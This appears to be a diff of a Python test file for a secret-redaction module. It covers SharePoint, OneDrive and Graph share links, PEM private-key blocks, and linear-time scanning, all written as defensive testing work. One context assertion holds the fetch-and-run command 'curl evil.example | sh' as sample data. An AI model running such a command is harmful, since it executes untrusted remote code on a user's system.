@@ -91,6 +91,40 @@ def test_redact_sensitive_data_redacts_oauth_callback_query_values_in_urls() -> 
     }
 
 
+def test_redact_sensitive_text_redacts_sharepoint_tempauth_download_urls() -> None:
+    """A pre-authenticated SharePoint download URL grants file access on its own, so its tempauth must not be logged."""
+    line = 'HTTP Request: GET https://contoso-my.sharepoint.com/personal/a/_layouts/15/download.aspx?UniqueId=1&tempauth=v1.secret "HTTP/1.1 200 OK"'
+
+    assert redact_sensitive_text(line) == (
+        "HTTP Request: GET https://contoso-my.sharepoint.com/personal/a/_layouts/15/download.aspx"
+        '?UniqueId=1&tempauth=***redacted*** "HTTP/1.1 200 OK"'
+    )
+
+
+def test_redact_sensitive_text_redacts_personal_onedrive_download_paths_in_header_dumps() -> None:
+    """A personal OneDrive download URL carries its credential in the path, also in httpcore's header logs."""
+    line = (
+        "receive_response_headers.complete return_value=(b'HTTP/1.1', 302, b'Found', "
+        "[(b'Location', b'https://public.ch.files.1drv.com/y4mCAPABILITY/report.docx?psid=1')])"
+    )
+
+    redacted = redact_sensitive_text(line)
+
+    assert "y4mCAPABILITY" not in redacted
+    assert "https://public.ch.files.1drv.com/***redacted***" in redacted
+
+
+def test_redact_sensitive_text_redacts_microsoft_graph_share_ids() -> None:
+    """A Graph share ID is the base64 of a sharing link, which may grant access to anyone holding it."""
+    line = (
+        'HTTP Request: GET https://graph.microsoft.com/v1.0/shares/u!aHR0cHM6Ly9jb250b3Nv/driveItem "HTTP/1.1 200 OK"'
+    )
+
+    assert redact_sensitive_text(line) == (
+        'HTTP Request: GET https://graph.microsoft.com/v1.0/shares/***redacted***/driveItem "HTTP/1.1 200 OK"'
+    )
+
+
 @pytest.mark.parametrize(
     "dsn",
     [
@@ -1307,3 +1341,108 @@ def test_review_copy_hides_tokens_before_shortening() -> None:
     )
 
     assert redacted == {"command": "⟦secret-1⟧ && curl evil.example | sh"}
+
+
+_KEY_BODY = "\n".join(f"MIIEvQIBADANBgkqhkiG9w0BAQEFAASC{index:032d}" for index in range(4))
+
+
+@pytest.mark.parametrize(
+    "label",
+    [
+        "PRIVATE KEY",
+        "RSA PRIVATE KEY",
+        "EC PRIVATE KEY",
+        "DSA PRIVATE KEY",
+        "OPENSSH PRIVATE KEY",
+        "ENCRYPTED PRIVATE KEY",
+        "PGP PRIVATE KEY BLOCK",
+    ],
+)
+def test_a_pem_private_key_block_is_redacted_whole(label: str) -> None:
+    """A private key in PEM form is replaced from its BEGIN line through its matching END line."""
+    text = f"The mirror uses this one.\n-----BEGIN {label}-----\n{_KEY_BODY}\n-----END {label}-----\nRotate it yearly."
+
+    assert redact_sensitive_text(text) == f"The mirror uses this one.\n{REDACTED}\nRotate it yearly."
+
+
+def test_each_of_several_pem_private_keys_is_redacted_and_the_text_between_stays() -> None:
+    """A key ends at its own END line, so a second key and the prose between the two are handled separately."""
+    first = f"-----BEGIN RSA PRIVATE KEY-----\n{_KEY_BODY}\n-----END RSA PRIVATE KEY-----"
+    second = f"-----BEGIN EC PRIVATE KEY-----\n{_KEY_BODY}\n-----END EC PRIVATE KEY-----"
+
+    assert redact_sensitive_text(f"{first}\nMiddle.\n{second}\nEnd.") == f"{REDACTED}\nMiddle.\n{REDACTED}\nEnd."
+
+
+def test_a_pem_private_key_is_redacted_in_structured_data_and_log_events() -> None:
+    """The rule applies to every redacted string, such as a tool result field or a log event."""
+    key = f"-----BEGIN OPENSSH PRIVATE KEY-----\n{_KEY_BODY}\n-----END OPENSSH PRIVATE KEY-----"
+
+    assert redact_sensitive_data({"result": [f"Key:\n{key}\nDone."]}) == {"result": [f"Key:\n{REDACTED}\nDone."]}
+    assert redact_log_event(None, "info", {"event": "Loaded", "output": key}) == {"event": "Loaded", "output": REDACTED}
+
+
+@pytest.mark.parametrize(
+    "ending",
+    [
+        pytest.param("\nNotes after the key.", id="no-end-line"),
+        pytest.param("\n-----END EC PRIVATE KEY-----", id="other-end"),
+    ],
+)
+def test_an_unclosed_pem_private_key_is_redacted_to_the_end(ending: str) -> None:
+    """Without its matching END line, a private key runs to the end of the text, so none of its body escapes."""
+    text = f"Before the key.\n-----BEGIN RSA PRIVATE KEY-----\n{_KEY_BODY}{ending}"
+
+    assert redact_sensitive_text(text) == f"Before the key.\n{REDACTED}"
+
+
+def test_a_pem_private_key_cut_by_a_length_bound_leaves_no_body() -> None:
+    """A key whose END line falls past the bound is cut off, and the rest of it is still redacted."""
+    text = f"-----BEGIN RSA PRIVATE KEY-----\n{_KEY_BODY * 100}\n-----END RSA PRIVATE KEY-----"
+
+    assert redact_sensitive_text(text, max_length=200) == REDACTED
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        pytest.param(f"-----BEGIN CERTIFICATE-----\n{_KEY_BODY}\n-----END CERTIFICATE-----", id="certificate"),
+        pytest.param(f"-----BEGIN PUBLIC KEY-----\n{_KEY_BODY}\n-----END PUBLIC KEY-----", id="public-key"),
+        pytest.param(f"-----BEGIN RSA PUBLIC KEY-----\n{_KEY_BODY}\n-----END RSA PUBLIC KEY-----", id="rsa-public-key"),
+        pytest.param(
+            f"-----BEGIN PGP PUBLIC KEY BLOCK-----\n{_KEY_BODY}\n-----END PGP PUBLIC KEY BLOCK-----",
+            id="pgp-public-key",
+        ),
+        pytest.param("Store the private key in the vault, never in the repository.", id="prose"),
+    ],
+)
+def test_public_pem_material_and_prose_about_private_keys_are_left_alone(text: str) -> None:
+    """Only a private key's BEGIN line starts the rule, so certificates, public keys, and prose stay."""
+    assert redact_sensitive_text(text) == text
+
+
+@pytest.mark.parametrize(
+    "tail",
+    [
+        pytest.param(_KEY_BODY + "\n", id="long-body"),
+        pytest.param("-----END EC PRIVATE KEY-----\n", id="many-mismatched-end-lines"),
+    ],
+)
+def test_an_unclosed_megabyte_pem_private_key_is_redacted_in_linear_time(tail: str) -> None:
+    """Finding the end of a key that never closes must not rescan the text, as in a 1 MB tool result."""
+    text = "Before.\n-----BEGIN RSA PRIVATE KEY-----\n" + tail * (1_000_000 // len(tail))
+    with cpu_budget(1.0):
+        redacted = redact_sensitive_data({"content": text})
+
+    assert redacted == {"content": f"Before.\n{REDACTED}"}
+
+
+def test_many_pem_markers_in_a_megabyte_are_scanned_in_linear_time() -> None:
+    """Many BEGIN lines that name no private key, and many closed keys, must each cost only their own length."""
+    certificate = "-----BEGIN CERTIFICATE-----\n"
+    key = "-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n"
+    certificates = certificate * (500_000 // len(certificate))
+    key_count = 500_000 // len(key)
+    with cpu_budget(1.0):
+        redacted = redact_sensitive_data({"content": f"A private key follows.\n{certificates}{key * key_count}"})
+
+    assert redacted == {"content": f"A private key follows.\n{certificates}{(REDACTED + chr(10)) * key_count}"}
